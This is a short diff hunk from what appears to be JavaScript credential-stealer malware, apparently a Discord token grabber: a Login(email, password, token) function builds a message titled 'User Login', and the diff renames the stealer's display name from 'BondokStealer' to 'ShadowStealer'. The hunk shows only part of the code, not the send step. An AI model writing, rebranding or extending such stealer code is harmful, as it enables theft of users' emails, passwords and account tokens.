@@ -453,7 +453,7 @@ function Login(email, password, token) {
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "BondokStealer",
+								username: "ShadowStealer",
 								content: "",
 								embeds: [{
 									"title": "User Login",
